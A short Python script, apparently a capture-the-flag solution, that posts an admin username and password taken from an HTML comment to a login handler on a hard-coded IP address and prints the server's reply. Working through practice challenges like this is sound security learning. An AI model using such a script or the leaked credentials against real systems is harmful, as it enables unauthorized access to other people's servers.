import requests

# <!-- username: admin | password: 71urlkufpsdnlkadsf -->
payload = {'username':'admin', 'password': '71urlkufpsdnlkadsf'}
r = requests.post('http://165.227.106.113/post.php', data=payload)
print('[+] My payload %s' % payload)
print(r.text)